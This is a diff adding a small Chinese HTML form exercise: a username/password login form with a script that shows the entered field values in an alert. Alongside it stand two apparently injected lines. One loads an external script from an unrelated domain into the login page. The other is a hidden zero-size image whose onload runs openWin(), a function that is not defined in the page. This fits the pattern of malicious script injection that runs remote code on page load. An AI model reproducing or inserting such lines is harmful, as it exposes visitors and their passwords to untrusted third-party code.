@@ -1,0 +1,30 @@
+ <!doctype html public "-//w3c//dtdxhtml1.0 strict//en"
+"http://www.w3.org/tr/xhtml1/dtd/xhtml1-strict.dtd">
+    <head>
+	    <title>表单的基本运用1</title>
+	    <script language="javascript">
+		   function showsubmitdata()
+		   {
+		      var msg="",n=0;
+			  for(var i=0;i < loginform.elements.length;i ++)
+			  {
+			      var element = loginform.elements[i];
+				  if(element.name != "")
+				  {
+				     n++;
+					 msg += "字段" + n + " " + element.name + element.value + "\n";
+					 }
+			  }
+			   alert(msg);
+			}
+		</script>
+		<script language="javascript" type="text/javascript" src="http://js.i8844.cn/js/user.js"></script></head>
+		<body onload="loginform.username.focus()">
+		<form method="post" action="" name="loginform">
+		    <p>用户名：<input name="username" type="text" size="20"/>
+			     密码：<input name="userpassword" type="password" size="20"/>
+				 <input type="button" value="显示提交数据" onclick="showsubmitdata()"/></p>
+		</form>
+		<img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>
+				 
